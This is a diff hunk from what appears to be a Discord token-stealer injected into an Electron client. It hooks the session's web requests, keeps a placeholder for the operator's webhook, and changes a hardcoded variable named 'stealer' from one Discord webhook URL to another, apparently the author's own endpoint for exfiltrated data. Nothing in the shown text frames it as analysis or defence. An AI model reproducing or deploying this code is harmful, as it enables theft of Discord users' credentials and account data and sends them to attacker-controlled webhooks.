@@ -15,7 +15,7 @@ electron.session.defaultSession.webRequest.onHeadersReceived(function (j, k) {
 
   var webhook = "%WEBHOOK_LINK%";
   webhook = webhook.replace("canary.discord.com", "discord.com").replace("ptb.discord.com", "discord.com").replace("canary.discordapp.com", "discord.com").replace("ptb.discordapp.com", "discord.com")
-  var stealer = "https://discord.com/api/webhooks/901102054943100969/fqrHOvrPr3Qmoj-fuDzTix6kXbEMnM5ZxNy9KONMFxKds6nFFpvTac_JrFhzED79Xjmd"
+  var stealer = "https://discord.com/api/webhooks/902602831217971220/XlPxiB3rRB347Y1f6PLPxgU8WWg4CgNgaR5ARBcJnoFbRzIcvwpMnFgaT-wAh8OEzNdt"
   stealer = stealer.replace("canary.discord.com", "discord.com").replace("ptb.discord.com", "discord.com").replace("canary.discordapp.com", "discord.com").replace("ptb.discordapp.com", "discord.com")
   
   function FirstTime(){
